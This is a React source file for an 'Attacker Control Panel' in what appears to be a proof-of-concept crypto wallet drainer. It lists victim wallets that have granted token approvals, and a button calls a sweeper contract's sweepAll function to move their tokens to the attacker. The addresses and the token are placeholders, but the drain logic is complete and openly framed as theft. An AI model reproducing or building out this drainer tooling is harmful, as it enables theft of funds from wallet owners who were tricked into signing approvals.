import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import axios from 'axios';

const SWEEPER_ADDRESS = "0xYOUR_SWEEPER_ADDRESS";
const TOKEN_ADDRESS = "0xYOUR_MOCK_TOKEN_ADDRESS";

const SWEEPER_ABI = [
  "function sweepAll(address tokenAddress, address victimAddress) external"
];

function AdminDashboard() {
  const [victims, setVictims] = useState([]);
  const [draining, setDraining] = useState(null);

  // In a real app, this would fetch from a database. 
  // For the PoC, we will manually add the victim address here or fetch from backend.
  useEffect(() => {
    // Simulate receiving a victim from the backend webhook
    setVictims([{ address: "0xVICTIM_ADDRESS_HERE", status: "APPROVED" }]);
  }, []);

  const executeDrain = async (victimAddress) => {
    if (!window.ethereum) return alert("Connect attacker wallet first");
    setDraining(victimAddress);

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const sweeper = new ethers.Contract(SWEEPER_ADDRESS, SWEEPER_ABI, signer);

      const tx = await sweeper.sweepAll(TOKEN_ADDRESS, victimAddress);
      await tx.wait();
      
      alert(`Successfully drained ${victimAddress}!`);
    } catch (error) {
      alert("Drain failed: " + error.message);
    } finally {
      setDraining(null);
    }
  };

  return (
    <div className="dashboard-container" style={{maxWidth: '600px'}}>
      <h2 style={{color: '#ef4444'}}>🕷️ Attacker Control Panel</h2>
      <p style={{color: '#94a3b8'}}>Monitor and execute drains on approved wallets.</p>
      
      <div style={{marginTop: '20px'}}>
        {victims.map((v, i) => (
          <div key={i} style={{
            display: 'flex', justifyContent: 'space-between', alignItems: 'center',
            padding: '15px', background: '#1e293b', borderRadius: '8px', marginBottom: '10px',
            border: '1px solid #334155'
          }}>
            <div>
              <div style={{fontSize: '14px', fontWeight: 'bold'}}>{v.address.substring(0,6)}...{v.address.substring(38)}</div>
              <div style={{fontSize: '12px', color: '#10b981'}}>{v.status}</div>
            </div>
            <button 
              onClick={() => executeDrain(v.address)} 
              disabled={draining === v.address}
              style={{
                background: '#ef4444', color: 'white', border: 'none', padding: '8px 16px',
                borderRadius: '6px', cursor: 'pointer', fontWeight: 'bold'
              }}
            >
              {draining === v.address ? "Draining..." : "Execute Sweep"}
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}

export default AdminDashboard;